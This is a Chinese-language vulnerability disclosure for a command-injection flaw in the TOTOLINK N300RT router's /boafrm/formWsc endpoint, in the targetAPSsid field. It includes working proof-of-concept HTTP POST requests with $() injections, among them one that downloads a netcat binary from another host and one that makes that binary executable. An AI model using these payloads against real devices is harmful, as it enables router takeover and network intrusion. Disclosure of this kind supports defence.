## TOTOLINK N300RT Router

固件版本： V3.4.0-B20250430

漏洞类型：命令注入

### 概述

TOTOLINK N300RT Router中发现了一个命令注入漏洞，攻击者可以通过发送恶意 HTTP POST 数据包来利用该漏洞执行任意命令。当请求路径为 `/boafrm/formWsc` 时，该漏洞可被触发，要求用户登录，发送报文时需要构造`sessionCheck`。

### 漏洞详情

触发点位于`boa` 组件中的`sub_441468`方法，此处对于`targetAPSsid`字段校验不够充分，可以使用$()的方法来绕过，可执行长度不超过32字节的命令。

![](../main/images/1.png)



### 概念验证

```http
POST /boafrm/formWsc HTTP/1.1

Host: 192.168.1.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 162

Origin: http://192.168.1.1

Connection: close

Referer: http://192.168.1.1/wlwps.htm

Upgrade-Insecure-Requests: 1

Priority: u=0, i


sessionCheck=4843ff699e3002d927adc0b1ff4a9fe4&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=test$(echo test > /tmp/cccc)
```

![](../main/images/2.png)

除此之外，下面的poc也可用

```http
sessionCheck=4843ff699e3002d927adc0b1ff4a9fe4&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=test$(sh -c 'echo 1 > /tmp/aa')

sessionCheck=d4dc13600dbd8d351ce74e0689da0db8&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=t$(wget 192.168.1.2:9090/nc)

sessionCheck=d4dc13600dbd8d351ce74e0689da0db8&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=t$(chmod 777 /var/boa/nc)

```



